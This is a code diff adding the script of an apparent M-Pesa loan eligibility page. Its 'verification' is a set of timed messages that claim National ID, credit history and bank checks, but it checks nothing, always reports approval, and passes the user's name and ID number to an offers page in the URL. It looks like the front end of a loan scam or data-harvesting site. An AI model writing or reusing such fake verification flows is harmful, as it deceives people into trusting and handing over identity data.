+                successState.classList.add('hidden');
+
+                // Enhanced eligibility check simulation with professional steps
+                const verificationSteps = [
+                    { message: 'Initializing secure verification process', duration: 1000 },
+                    { message: 'Validating personal information', duration: 1500 },
+                    { message: 'Verifying National ID with government database', duration: 2000 },
+                    { message: 'Checking phone number and M-Pesa account status', duration: 1800 },
+                    { message: 'Analyzing credit history and score', duration: 2200 },
+                    { message: 'Evaluating employment and income details', duration: 1700 },
+                    { message: 'Cross-referencing with banking institutions', duration: 1900 },
+                    { message: 'Calculating loan eligibility and limits', duration: 1600 },
+                    { message: 'Finalizing risk assessment', duration: 1200 },
+                    { message: 'Preparing loan offers and terms', duration: 1000 }
+                ];
+
+                let currentStepIndex = 0;
+                let progress = 0;
+                let dotCount = 0;
+                const totalSteps = verificationSteps.length;
+
+                const updateProgress = () => {
+                    if (currentStepIndex < totalSteps) {
+                        const step = verificationSteps[currentStepIndex];
+                        const dots = '.'.repeat((dotCount % 4));
+                        const dotsDisplay = dots.padEnd(3, ' ');
+                        
+                        loadingText.innerHTML = `
+                            <div class="w-2 h-2 bg-blue-500 rounded-full animate-pulse mr-3"></div>
+                            ${step.message}${dotsDisplay}
+                        `;
+                        
+                        // Calculate progress more smoothly
+                        const stepProgress = ((currentStepIndex + 1) / totalSteps) * 100;
+                        progress = Math.min(stepProgress, 100);
+                        
+                        progressBar.style.width = `${progress}%`;
+                        progressPercentage.textContent = `${Math.round(progress)}%`;
+                        
+                        dotCount++;
+                    }
+                };
+
+                // Start the verification process
+                const progressInterval = setInterval(updateProgress, 200);
+
+                // Move through steps
+                let stepTimeout;
+                const processSteps = () => {
+                    if (currentStepIndex < totalSteps) {
+                        const step = verificationSteps[currentStepIndex];
+                        stepTimeout = setTimeout(() => {
+                            currentStepIndex++;
+                            processSteps();
+                        }, step.duration);
+                    } else {
+                        // Complete the verification
+                        clearInterval(progressInterval);
+                        clearTimeout(stepTimeout);
+                        
+                        // Final progress update
+                        progressBar.style.width = '100%';
+                        progressPercentage.textContent = '100%';
+                        loadingText.innerHTML = `
+                            <div class="w-2 h-2 bg-green-500 rounded-full mr-3"></div>
+                            Verification completed successfully!
+                        `;
+                        
+                        // Update localStorage status
+                        localStorage.setItem('swift_eligibility_status', 'approved');
+                        localStorage.setItem('swift_verification_completed', new Date().toISOString());
+                        
+                        // Show success state after a brief pause
+                        setTimeout(() => {
+                            this.showSuccessState();
+                        }, 1000);
+                    }
+                };
+
+                // Start processing steps
+                processSteps();
+            }
+
+            showSuccessState() {
+                const loadingState = document.getElementById('loadingState');
+                const successState = document.getElementById('successState');
+                
+                // Hide loading state and show success state
+                loadingState.classList.add('hidden');
+                successState.classList.remove('hidden');
+                
+                                // Redirect after showing success state
+                setTimeout(() => {
+                    const modal = document.getElementById('loadingModal');
+                    modal.classList.add('hidden');
+                    modal.classList.remove('flex');
+                    const name = localStorage.getItem('customerName') || '';
+                     const id = localStorage.getItem('idNumber') || '';
+                    // Redirect to offers page
+                window.location.href = `offers.html?name=${encodeURIComponent(name)}&id=${encodeURIComponent(id)}`;
+                }, 3000);
+            }
+       
+
+            showNotification(message, type = 'info') {
+                // Create notification element
+                const notification = document.createElement('div');
+                notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg transition-all duration-300 transform translate-x-full`;
+                
+                if (type === 'error') {
+                    notification.className += ' bg-red-500 text-white';
+                } else if (type === 'success') {
+                    notification.className += ' bg-green-500 text-white';
+                } else {
+                    notification.className += ' bg-blue-500 text-white';
+                }
+                
+                notification.innerHTML = `
+                    <div class="flex items-center space-x-2">
+                        <span>${message}</span>
+                        <button onclick="this.parentElement.parentElement.remove()" class="ml-2 text-white hover:text-gray-200">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                            </svg>
+                        </button>
+                    </div>
+                `;
+                
+                document.body.appendChild(notification);
+                
+                // Animate in
+                setTimeout(() => {
+                    notification.classList.remove('translate-x-full');
+                }, 10);
+                
+                // Auto remove after 5 seconds
+                setTimeout(() => {
+                    notification.classList.add('translate-x-full');
+                    setTimeout(() => {
+                        if (notification.parentElement) {
+                            notification.remove();
+                        }
+                    }, 300);
+                }, 5000);
+            }
+        }
+
+        // Mobile menu functionality
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobile-menu');
+            menu.classList.toggle('hidden');
+        }
+
+        // Initialize form when DOM is loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            new EligibilityForm();
+        });
+    </script>
+</body>
+</html>
